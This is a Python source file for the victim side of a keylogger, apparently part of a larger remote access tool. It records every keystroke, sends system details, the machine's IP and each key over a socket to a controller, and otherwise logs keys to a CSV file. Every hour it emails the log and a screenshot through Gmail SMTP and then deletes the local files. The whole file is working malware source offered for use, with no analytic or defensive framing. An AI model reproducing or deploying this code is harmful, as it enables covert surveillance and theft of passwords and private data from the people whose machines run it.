import os
import pickle
from utils import get_system_information, get_time, write_file
from pynput.keyboard import Listener
from base64 import b64encode, b64decode
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from CommunicationTarget import CommunicationTarget
from MenuHandlerTarget import MenuHandlerTarget


class KeyLoggerTarget:
	def __init__(self, connection, menu, path, sys_name, email_address, email_password):
		self.email_address = email_address
		self.email_password = email_password
		self.smtp_alias = 'smtp.gmail.com'
		self.smtp_port = 587
		self.keys = None
		self.temp_path = path
		self.sys_name = sys_name

		if isinstance(connection, CommunicationTarget):
			self.connection = connection
		else:
			raise TypeError("\'connection\' parameter should be \'CommunicationTarget\' type!")
		if isinstance(menu, MenuHandlerTarget):
			self.menu = menu
		else:
			raise TypeError("\'menu\' parameter should be \'MenuHandlerTarget\' type!")


	def on_release(self, key):
		self.keys = key


	def run(self):
		data = get_system_information(self.sys_name)
		data[1].append(self.connection.pc_ip)
		data = b64encode(str(data).encode())
		data = pickle.dumps(data)
		self.connection.socket_stream.send(data)

		keyboard_listener = Listener(on_release=self.on_release)
		keyboard_listener.start()

		while True:
			if self.keys is not None:
				date_time = get_time()
				key = str(self.keys).replace("'", "")
				data = ["chars", date_time, key]
				self.keys = None
				data = b64encode(str(data).encode())
				data = pickle.dumps(data)

				try:
					self.connection.socket_stream.send(data)
				except Exception:
					self.connection.socket_stream.close()
					self.connection.socket_interact.close()
					break

		self.menu.stop()

		filename = 'log.csv'
		prev_hours = get_time()[13:15]

		while True:
			if self.keys is not None:
				date_time = get_time()
				key = str(self.keys).replace("'", "")
				data = [date_time, key]
				self.keys = None

				write_file(os.path.join(self.temp_path, filename), data)

			if get_time()[13:15] != prev_hours:
				prev_hours = get_time()[13:15]

				if os.path.isfile(os.path.join(self.temp_path, filename)):
					msg = MIMEMultipart()
					msg['From'] = self.email_address
					msg['To'] = self.email_address
					msg['Subject'] = 'Keylogger result'
					body = date_time
					msg.attach(MIMEText(body, 'plain'))
					file_attachment = MIMEBase('application', 'octet-stream')

					with open(os.path.join(self.temp_path, filename), 'rb') as handler:
						file_attachment.set_payload(handler.read())

					encoders.encode_base64(file_attachment)
					file_attachment.add_header('Content-Disposition', "attachment; filename=" + filename)
					msg.attach(file_attachment)

					if take_screenshot(self.temp_path):
						image_attachment = MIMEBase('application', 'octet-stream')

						with open(os.path.join(self.temp_path, "screenshot.png"), 'rb') as handler:
							image_attachment.set_payload(handler.read())

						encoders.encode_base64(image_attachment)
						image_attachment.add_header('Content-Disposition', "attachment; filename=screenshot.png")
						msg.attach(image_attachment)

					content = msg.as_string()

					with smtplib.SMTP(self.smtp_alias, self.smtp_port) as smtp_server:
						smtp_server.starttls()
						smtp_server.login(self.email_address, self.email_password)
						smtp_server.sendmail(self.email_address, self.email_address, content)

					if os.path.isfile(os.path.join(self.temp_path, filename)):
						os.remove(os.path.join(self.temp_path, filename))
					if os.path.isfile(os.path.join(self.temp_path, "screenshot.png")):
						os.remove(os.path.join(self.temp_path, "screenshot.png"))